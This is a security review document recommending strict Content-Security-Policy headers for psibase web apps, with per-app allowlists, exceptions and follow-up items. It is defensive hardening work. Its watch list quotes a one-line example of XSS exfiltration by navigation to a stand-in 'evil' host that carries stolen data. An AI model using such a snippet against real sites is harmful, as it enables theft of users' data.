# Content Security Policy Recommendations

Security review deliverable for tightening the Content-Security-Policy (CSP)
headers served to psibase web apps.

Reference: <https://infosec.mozilla.org/guidelines/web_security.html>

## Goal

Replace today's single permissive baseline with a **strict-by-default** policy,
and enumerate the small set of apps that legitimately need a looser policy.
Every CSP below is the strictest policy that still lets the app function, given
the platform architecture verified in the codebase.

---

## Default CSP

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self' profiles.{root} tokens.{root};
frame-src supervisor.{root};
frame-ancestors 'self';
base-uri 'none';
form-action 'self';
object-src 'none';
```

As a single header value:

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: profiles.{root}/avatar/ branding.{root}; font-src 'self'; connect-src 'self' profiles.{root} tokens.{root}; frame-src supervisor.{root}; frame-ancestors 'self'; base-uri 'none'; form-action 'self'; object-src 'none';
```

> **Notation.** Host sources are written **scheme-relative** (no `http://` /
> `https://` prefix). A schemeless host-source adopts the document's own scheme
> (and auto-upgrades `http`→`https` under an `https` page), so one injected string
> works unchanged in both `http` local dev and `https` production. `{root}` is the
> deployment root host **including port** (e.g. `psibase.localhost:8080` locally,
> `example.com` in prod), injected per request from `rootHost` +
> `hostHeaderPortSuffix` (see Assumptions and the dev/localhost note).

### Rationale

| Directive | Value | Why |
| --- | --- | --- |
| `default-src` | `'self'` | Backstop for any directive not listed. |
| `script-src` | `'self'` | Verified for all Vite-built apps: no inline `<script>`, no `eval`/`new Function`/Wasm compilation, no `blob:`/CDN script loading. Dangerous script capabilities live in the supervisor only. The two non-Vite sites (Explorer/SvelteKit and Docs/mdbook) *do* emit inline scripts and are listed as exceptions. |
| `style-src` | `'self' 'unsafe-inline'` | Unavoidable: the shadcn chart component injects a runtime `<style>` via `dangerouslySetInnerHTML`. Style injection cannot execute JS, so risk is low. Removing it requires per-response style nonces, which conflicts with static hosting + ETag caching. |
| `img-src` | `'self' data: profiles.{root}/avatar/ branding.{root}` | `data:` for generated identicons (dicebear `toDataUri`) and base64 app icons (Workshop). `profiles.{root}/avatar/` (trailing slash = prefix match; CSP ignores query strings, so cache-bust params are fine) is the single avatar proxy host from Prerequisite B, replacing the former `{root} *.{root}` wildcard. `branding.{root}` because Config previews the network logo from `branding.{root}/network_logo.svg` — a fixed first-party host. The apex `{root}` is dropped: it only 302-redirects to the homepage subdomain (`HttpServer.cpp`), so nothing loads images from it. Arbitrary off-domain images still require per-app opt-in. |
| `font-src` | `'self'` | Fonts are self-hosted; no CDN font usage found. |
| `connect-src` | `'self' profiles.{root} tokens.{root}` | **Secure by default.** `'self'` covers everything the platform itself requires of an ordinary app: its own service's `/graphql` and RPC endpoints (served on the app's own subdomain), the `/common/*` endpoints (served same-origin on every subdomain, e.g. the `fetch("/common/chainid")` in shared-ui), and same-origin WebSockets. `profiles.{root}` and `tokens.{root}` are additionally granted because the shared UI hooks (`useProfile`, `useSystemToken`) fetch them from nearly every first-party app; both expose only public data and writes require signed transactions, so they are poor exfiltration targets. Supervisor comms is `postMessage` (not governed by CSP), and the supervisor's own cross-subdomain fetching happens inside its iframe under the *supervisor's* CSP. |
| `frame-src` | `supervisor.{root}` | The only iframe a normal app mounts is the hidden supervisor iframe injected by `@psibase/common-lib`. |
| `frame-ancestors` | `'self'` | Normal app pages are not meant to be embedded cross-origin (clickjacking defense). Apps that expose a prompt page override this — see exceptions. |
| `base-uri` | `'none'` | Nothing sets `<base>`; blocks `<base>`-injection that would redirect relative resource loads. |
| `form-action` | `'self'` | Apps submit via `fetch`, not native cross-origin form posts. |
| `object-src` | `'none'` | No `<object>`/`<embed>` usage. |

### Opting up from the default (`connect-src` and beyond)

The default is deliberately a floor, not a ceiling. An app that legitimately
needs more — direct `fetch` to another service's GraphQL, an external API,
off-domain images — opts up via the existing `setCsp` action (exposed through
the `sites` plugin and the Workshop UI). Two rules for anyone doing this:

1. **State a complete policy.** CSP here is replace-not-merge:
   a `setCsp` that contains only the directive you wanted to loosen silently
   *deletes* every other protection. Workshop should offer the default
   policy as a template to edit, so opting up one directive doesn't drop the
   rest.
2. **List hosts, not wildcards.** Add `invite.{root}`, not `*.{root}`. The
   Watch-list item on generated allowlists describes how first-party apps
   automate this at packaging time; third-party apps can hand-write the same
   shape in their `setCsp`.

### Companion header: `Referrer-Policy: same-origin`

Serve `Referrer-Policy: same-origin` platform-wide alongside the CSP (it is a
separate response header, not a CSP directive). Every psibase subdomain is a
distinct origin, so under the browser default
(`strict-origin-when-cross-origin`) any request from an app to another
subdomain — an avatar fetch, a clicked link — still announces the requesting
app's origin to the destination. `same-origin` keeps the full referrer URL
for same-origin requests (useful for first-party debugging) but sends
**nothing** cross-origin: no `Referer` header, empty `document.referrer`.
Tthis removes the "this user is currently in
app X" signal from anything an untrusted subdomain can observe. A page that
legitimately needs to send a cross-origin referrer can override per element
with the `referrerpolicy` attribute.

### Sites covered by the default

These apps were verified to fetch only same-origin endpoints (their own
`/graphql` and `/common/*`) from the page, so the strict default works as-is:

- `identity` (Identity)
- `common-api` (CommonApi; also serves the plugin-tester dev tool under
  `/common/plugin-tester/` — it is part of this site, not its own subdomain,
  and calls plugins via the supervisor, not direct fetch)

A few service-only packages (`branding`, `chainmail`, `guilds`, `tokens`)
declare `data` uploads in their `Cargo.toml` but have no in-tree UI source
(the standalone Chainmail UI now lives inside Homepage); whatever static
content they serve also falls under the default.

### First-party apps needing a `connect-src` allowlist

These apps `fetch` other services directly from the page, so under the strict
default they need a `setCsp` override = **default + enumerated hosts in
`connect-src`**. Hosts verified in-tree
(and implemented as postinstall `setcsp` overrides):

| App | Extra `connect-src` hosts | Verified direct fetches |
| --- | --- | --- |
| `homepage` (Homepage, incl. Chainmail/Contacts/Tokens/Token-swap/Accounts-marketplace sub-apps) | `invite.{root}` `tokens.{root}` `token-swap.{root}` `vserver.{root}` `producers.{root}` `profiles.{root}` `namemarket.{root}` | invite GraphQL (`pages/invite.tsx`); tokens GraphQL (`apps/tokens/lib/graphql/ui.ts`, shared `use-system-token`); token-swap GraphQL (`apps/token-swap/hooks/use-pools.ts`); shared `use-billing-config` (vserver); shared `get-producers`; shared `use-profile` (nav/contacts); shared `use-account-markets` |
| `config` (Config) | `producers.{root}` `sites.{root}` `staged-tx.{root}` `transact.{root}` `vserver.{root}` `tokens.{root}` `profiles.{root}` `x-admin.{root}` `packages.{root}` **`http:` `https:`** | candidates/tx-history/staged-tx hooks; sites GraphQL (logo check); vserver pricing hooks; shared `use-system-token`; sidebar profile; package-index fetches. The `http:`/`https:` scheme sources exist because Config's custom package sources are user-configured URLs at arbitrary hosts — a supported feature that cannot be host-allowlisted. They subsume the enumerated hosts (kept to document first-party needs, and so the list survives if the scheme grant is ever replaced by a package-source proxy). Trade-off: Config alone retains a fetch-anywhere channel; acceptable because it is an operator-facing app, but see Watch list. |
| `fractal-cr` (FractalCore) | `guilds.{root}` `fractals.{root}` `evaluation.{root}` `invite.{root}` `staged-tx.{root}` `profiles.{root}` | guild/fractal/invite GraphQL (`lib/graphql/fractals/*`, shared `get-fractal`/`get-membership`); evaluation GraphQL (`lib/graphql/evaluations/*`); staged-tx via shared `checkLastTx`; sidebar profile |
| `workshop` (Workshop) | `registry.{root}` `setcode.{root}` `sites.{root}` `profiles.{root}` | app-metadata (registry), code-hash (setcode), site-config (sites) hooks; sidebar profile |
| `tok-stream` (TokenStream) | `nft.{root}` `tokens.{root}` `profiles.{root}` | nft/token GraphQL (`lib/get-*.ts`); stream GraphQL is same-origin (covered by `'self'`); sidebar profile. |
| `accounts` (Accounts) | `tokens.{root}` `namemarket.{root}` | system-token lookup and account-market overview in `create-prompt.tsx` (shared `use-system-token`, `use-account-markets`) |

Explorer and Docs also exist on this branch but need exceptions (see below)
because their build tooling emits inline scripts; Explorer additionally
fetches `tokens.{root}` directly (allowlisted in its exception policy).

---

## Exceptions

Beyond the first-party `connect-src` allowlists above (which are just the
default plus enumerated hosts), five Sites need a structurally different
policy.

### 1. Supervisor (`supervisor`) — special in both directions

The supervisor is the trust-mediation iframe. It is unique because it:

- compiles and instantiates WebAssembly plugins in the browser
  (`WebAssembly.compile`) and imports jco-generated JS via `blob:` URLs
  (`packages/user/Supervisor/ui/src/component-loading/loader.ts`);
- fetches plugin `.wasm` and service GraphQL from **any** service subdomain;
- is **embedded as a hidden iframe by every app** (its `index.html`), so it must
  allow being framed by all subdomains; and
- **embeds every app's prompt page** (its `prompt.html` loads
  `https://<promptApp>.{root}/plugin/web/prompt/<name>`), so it must be allowed
  to frame all subdomains.

Recommended (site-wide) policy:

```
default-src 'self';
script-src 'self' 'wasm-unsafe-eval' blob:;
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self' blob: {root} *.{root};
frame-src {root} *.{root};
frame-ancestors {root} *.{root};
base-uri 'none';
form-action 'self';
object-src 'none';
```

Notes:

- `script-src` keeps `'wasm-unsafe-eval'` (for `WebAssembly.compile`) and
  `blob:` (for `import(blobUrl)` of jco output), but still **omits
  `'unsafe-inline'`** — the supervisor loads an external module script, no inline
  scripts. **Verify in testing:** if jco instantiation triggers JS `eval`,
  fall back from `'wasm-unsafe-eval'` to `'unsafe-eval'`. This is still tighter
  than today's default, which grants both `'unsafe-eval'` and `'unsafe-inline'`.
- `frame-src` and `frame-ancestors` are both `*.{root}` (plus apex) because the
  supervisor both embeds prompt apps and is embedded by all apps.
- With the strict default in place, the supervisor is the **only** site whose
  `connect-src` has the `*.{root}` wildcard. That is by design: it must load
  plugin `.wasm` and query GraphQL from arbitrary service subdomains, and
  concentrating that capability in the one origin built to mediate trust is
  the point of the architecture.

### 2. Accounts (`accounts`) — serves prompt pages, is an SPA

Accounts serves prompt UIs at `/plugin/web/prompt/{connect,import,create}`
(`packages/system/Accounts/ui/src/router.tsx`) and triggers prompts via
`host:prompt` (`Prompt::prompt("connect", ...)`). These pages are embedded
cross-origin by the supervisor's `prompt.html`, so they must allow
`supervisor.{root}` as a frame ancestor.

Because Accounts is a **single-page app** (`enablespa`), all routes resolve to
the same `index.html` content row, so a path-scoped CSP cannot single out the
prompt routes — the exception must be applied **site-wide** (`setCsp` with path
`*`).

Recommended (site-wide) policy = default, with `frame-ancestors` widened.
Accounts' account and key operations go through the supervisor, but its
create-account prompt fetches directly from the page: the system-token
lookup (shared `use-system-token`) and the account-market overview (shared
`use-account-markets`), so `connect-src` also needs `tokens.{root}` and
`namemarket.{root}`:

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self' tokens.{root} namemarket.{root};
frame-src supervisor.{root};
frame-ancestors 'self' supervisor.{root};
base-uri 'none';
form-action 'self';
object-src 'none';
```

### 3. Permissions (`perms`) — serves a prompt page

Permissions serves a static prompt page at
`/plugin/web/prompt/permissions/index.html` and triggers prompts via
`host:prompt`. It is **not** an SPA and already ships a `postinstall.json` CSP
override for that path — but the current value is `frame-ancestors *`, which is
looser than necessary.

Recommendation: keep the override **path-scoped** to the prompt page (the rest
of the `perms` site uses the default), and tighten the value from `*` to the
supervisor origin. Because a path CSP replaces the default entirely, the
override must be a complete policy:

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self';
frame-src supervisor.{root};
frame-ancestors supervisor.{root};
base-uri 'none';
form-action 'self';
object-src 'none';
```

### 4. Explorer (`explorer`) — SvelteKit inline bootstrap script

Explorer is the only SvelteKit app (`@sveltejs/adapter-static`,
`packages/user/Explorer/ui/svelte.config.js`). Unlike the Vite/React apps,
its built pages contain an **inline `<script>`** that bootstraps the app
(`__sveltekit_* = {...}; Promise.all([import("/_app/immutable/entry/...")])`).
The script's content embeds content-hashed asset paths, so it **changes every
build** — a hardcoded hash source is not maintainable by hand.

Recommended (site-wide) policy = default, with a build-time script hash and
`tokens.{root}` in `connect-src` (Explorer fetches token balances and symbol
data directly from the `tokens` subdomain, `ui/src/lib/loadData.js` and
`routes/account/[name]/+page.svelte`):

```
default-src 'self';
script-src 'self' 'sha256-{explorer-inline-script-hash}';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self' tokens.{root};
frame-src supervisor.{root};
frame-ancestors 'self';
base-uri 'none';
form-action 'self';
object-src 'none';
```

Implementation options, in order of preference:

1. **Compute the hash at package/upload time** and bake it into Explorer's
   site-wide `setCsp` (the inline script is identical across pages within a
   single build, so one hash suffices).
2. **Use SvelteKit's built-in CSP support** (`kit.csp` with `mode: "hash"`) —
   but note it injects a `<meta>` CSP, and when both a header and a meta policy
   are present the *intersection* is enforced, so the header must still allow
   the inline script. This option only helps if the header CSP is derived from
   the build output anyway.
3. **Fallback:** `script-src 'self' 'unsafe-inline'` for this one site. Still
   far tighter than today's default (no `unsafe-eval`, no `https:`/CDN scripts),
   but it forfeits XSS protection on Explorer; treat as temporary.

### 5. Docs (`docs`) — mdbook output with inline scripts and CDN dependencies

The documentation site is mdbook-generated HTML (`doc/`, uploaded by the
`Docs` package). It has three build-tooling requirements the default forbids:

- mdbook's theme emits **multiple inline `<script>` blocks in every page**
  (theme/sidebar initialization, `doc/theme/index.hbs`);
- `mathjax-support = true` loads **MathJax from `cdnjs.cloudflare.com`**
  (MathJax v2 also loads its web fonts from that CDN); and
- the custom theme loads **Mermaid from `cdn.jsdelivr.net`**
  (`doc/theme/js/mermaid-load.js` injects
  `https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js`).

Hashing the inline scripts is impractical: mdbook emits many distinct inline
blocks that change with mdbook/theme versions.

Recommended (site-wide) policy:

```
default-src 'self';
script-src 'self' 'unsafe-inline' cdnjs.cloudflare.com cdn.jsdelivr.net;
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self' cdnjs.cloudflare.com;
connect-src 'self';
frame-src 'none';
frame-ancestors 'self';
base-uri 'none';
form-action 'self';
object-src 'none';
```

Notes:

- Docs is static documentation with no login or transaction surface, so
  `'unsafe-inline'` here is a much smaller risk than it would be on an app.
- Docs does **not** embed the supervisor or fetch from sibling subdomains (it
  doesn't use `common-lib` at all), so `frame-src` is `'none'` — tighter than
  the default — and its `img-src` drops the avatar/branding sources too.
- The better long-term fix is to **vendor MathJax and Mermaid locally** (serve
  them from the `docs` site) and drop both CDN sources; see Watch list.
- The Google Analytics block in the theme is conditional on a `google_analytics`
  config value that is **not set** in `doc/book.toml.in`, so no
  `www.google-analytics.com` source is needed.

---

## Admin / local Sites (served by `x-sites`, not `sites`)

`x-admin` (XAdmin) and `x-proxy` (XProxy) are node-admin UIs served by the
**local** `x-sites` service, not `sites`. `x-sites` has **no default CSP** — it
only emits a header if one was stored on the content row at upload time
(`packages/local/XSites/src/XSites.cpp`). So these admin panels currently ship
with **no CSP at all**.

- **XAdmin** opens a same-origin WebSocket (`/native/admin/log`) and fetches the
  node's native admin API plus sibling admin services (`x-http`, `x-peers`,
  `x-packages`, `transact`).
- **XProxy** fetches `x-http` / `x-proxy` admin endpoints.

Recommended admin policy (same-origin WebSocket is covered by `'self'`; the
sibling admin services are enumerable, so no wildcard here either):

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self';
connect-src 'self' x-http.{root} x-peers.{root} x-packages.{root} x-proxy.{root} transact.{root};
frame-ancestors 'none';
base-uri 'none';
form-action 'self';
object-src 'none';
```

> **Implementation gap:** `x-sites` has no mechanism to apply a default CSP.
> Delivering the above requires either adding a default-CSP capability to
> `x-sites` (mirroring `sites`) or setting the CSP explicitly on admin content
> at upload time. `frame-ancestors 'none'` is appropriate because admin panels
> should never be embedded.

---

## Watch list / follow-ups

- **500 responses lack CORS headers.** psibase error replies (e.g. HTTP 500
  from service dispatch) omit `Access-Control-Allow-Origin`, while success,
  404, and preflight replies include it. A browser therefore reports any
  cross-origin 500 as "blocked by CORS policy: No 'Access-Control-Allow-Origin'
  header" — masking the real server error and making it look like a
  policy problem. Fix server-side by attaching the CORS headers to error
  replies too; until then, check psinode logs for the real status code when
  diagnosing "CORS" reports.
- **Config's `http:`/`https:` scheme grant.** Config's custom package
  sources are user-configured URLs at arbitrary hosts, so its `connect-src`
  carries `http: https:` — the one first-party fetch-anywhere channel left
  outside the supervisor. To remove it later, proxy package-index fetches
  through a first-party service (or route them through the supervisor) and
  drop the scheme sources, leaving only the enumerated host list.
- **Residual exfiltration via navigation.** Even with `img-src` and
  `connect-src` tight, CSP cannot block top-level navigation
  (`window.location = "https://evil.{root}/?stolen=…"`), so a determined XSS
  retains a noisy, one-shot exfiltration route. The realistic win from the
  tightening above is eliminating the *silent, repeatable* channels; calibrate
  expectations accordingly.
- **Docs: vendor MathJax and Mermaid.** Serving MathJax (and its fonts) and
  Mermaid from the `docs` site itself would remove `cdnjs.cloudflare.com` and
  `cdn.jsdelivr.net` from Exception 5 — the only third-party origins remaining
  in any recommended policy.
- **Optional hardening.** Add `upgrade-insecure-requests` on non-localhost
  deployments only — it must be suppressed locally (it would try to upgrade
  `http://…localhost:8080` to `https` and break dev). Gate it on the existing
  `isLocalhost` check (already used for the cookie `Secure` flag in
  `CommonApi.cpp`). `require-trusted-types-for 'script'` is aspirational — it
  needs app-side Trusted Types adoption first.

---

## Summary table

| Site | Service account | Policy | Scope | Reason |
| --- | --- | --- | --- | --- |
| Identity, CommonApi (incl. plugin-tester) | `identity`, `common-api` | **Default** | site-wide | Verified same-origin-only fetches |
| Homepage | `homepage` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `invite`, `tokens`, `token-swap`, `vserver`, `producers`, `profiles` |
| Config | `config` | Default + `connect-src` allowlist + `http:`/`https:` | site-wide (SPA) | Direct GraphQL/fetches to first-party services, plus user-configured custom package sources at arbitrary hosts |
| FractalCore | `fractal-cr` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `guilds`, `fractals`, `evaluation`, `invite`, `staged-tx`, `profiles` |
| Workshop | `workshop` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `registry`, `setcode`, `sites`, `profiles` |
| Evaluations, Fractals | `evaluation`, `fractals` | **Default** (no override) | site-wide (SPA) | Sidebar profile lookup (`profiles`) is covered by the default `connect-src` grant |
| TokenStream | `tok-stream` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `nft`, `tokens`, `profiles` (own stream GraphQL is same-origin) |
| Supervisor | `supervisor` | Exception 1 | site-wide | Wasm/blob, embeds prompts, embedded by all apps; sole holder of the `connect-src` wildcard |
| Accounts | `accounts` | Exception 2 | site-wide (SPA) | Serves prompt pages embedded by supervisor |
| Permissions | `perms` | Exception 3 | path (`/plugin/web/prompt/permissions/index.html`) | Serves a prompt page embedded by supervisor |
| Explorer | `explorer` | Exception 4 | site-wide | SvelteKit inline bootstrap script (per-build hash); fetches `tokens` directly |
| Docs | `docs` | Exception 5 | site-wide | mdbook inline scripts + MathJax (cdnjs) and Mermaid (jsdelivr) CDNs |
| XAdmin, XProxy | `x-admin`, `x-proxy` | Admin policy | via `x-sites` | Admin panels; `x-sites` has no default-CSP mechanism (gap) |
